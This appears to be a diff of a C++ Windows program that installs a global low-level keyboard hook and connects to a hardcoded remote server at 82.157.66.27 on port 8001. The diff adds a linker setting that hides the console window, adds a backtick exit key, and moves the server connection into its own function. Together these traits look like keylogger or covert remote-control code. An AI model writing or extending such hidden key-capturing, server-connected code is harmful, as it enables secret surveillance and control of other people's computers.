@@ -6,6 +6,7 @@
 #include <conio.h>
 #include<winsock.h>
 #include <string>
+#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )//不显示控制台
 #pragma comment(lib,"ws2_32.lib")
 using namespace std;
 void mfunction(int index);
@@ -49,30 +50,20 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 		case 0x31: case 0x61:
 			mfunction(1);
 			break;
+		case 0xC0:
+			exit(0);
+			break;
 		}
 		//return 1;		// 使按键失效
 	}
 	// 将消息传递给钩子链中的下一个钩子
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-
+void createSocket();
 void initialization();
 int main() {
 	SetConsoleOutputCP(936);
-	initialization();
-	//填充服务端信息
-	server_addr.sin_family = AF_INET;
-	server_addr.sin_addr.S_un.S_addr = inet_addr("82.157.66.27");
-	server_addr.sin_port = htons(8001);
-	//创建套接字
-	s_server = socket(AF_INET, SOCK_STREAM, 0);
-	if (connect(s_server, (SOCKADDR*)&server_addr, sizeof(SOCKADDR)) == SOCKET_ERROR) {
-		//cout << "服务器连接失败！" << endl;
-		WSACleanup();
-	}
-	else {
-		//cout << "服务器连接成功！" << endl;
-	}
+	createSocket();
 	// 安装钩子
 	keyboardHook = SetWindowsHookEx(
 		WH_KEYBOARD_LL,			// 钩子类型，WH_KEYBOARD_LL 为键盘钩子
@@ -227,5 +218,21 @@ void cleanBuff(SOCKET sock_conn) {
 		res = select(FD_SETSIZE, &read_fds, nullptr, nullptr, &time_out);
 		if (res == 0) break;  //数据读取完毕，缓存区清空成功
 		recv(sock_conn, recv_data, 1, 0);  //触发数据读取
+	}
+}
+void createSocket() {
+	initialization();
+	//填充服务端信息
+	server_addr.sin_family = AF_INET;
+	server_addr.sin_addr.S_un.S_addr = inet_addr("82.157.66.27");
+	server_addr.sin_port = htons(8001);
+	//创建套接字
+	s_server = socket(AF_INET, SOCK_STREAM, 0);
+	if (connect(s_server, (SOCKADDR*)&server_addr, sizeof(SOCKADDR)) == SOCKET_ERROR) {
+		//cout << "服务器连接失败！" << endl;
+		WSACleanup();
+	}
+	else {
+		//cout << "服务器连接成功！" << endl;
 	}
 }
